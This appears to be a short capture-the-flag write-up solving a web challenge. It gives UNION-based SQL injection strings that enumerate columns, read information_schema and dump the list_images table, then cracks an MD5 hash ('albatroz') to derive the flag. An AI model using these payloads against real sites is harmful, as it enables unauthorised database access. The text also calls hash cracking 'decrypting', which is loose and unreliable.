## 1
Use '1 OR 1=1 UNION SELECT NULL, NULL--' to get the columns
## 2
Use '1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns' to get columns for images
## 3
Use '1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images' to get all the info (screenshot 'sql')
## 4
Copy the code, use md5 to decrypt (the result is 'albatroz'), then sh256 will give us the flag.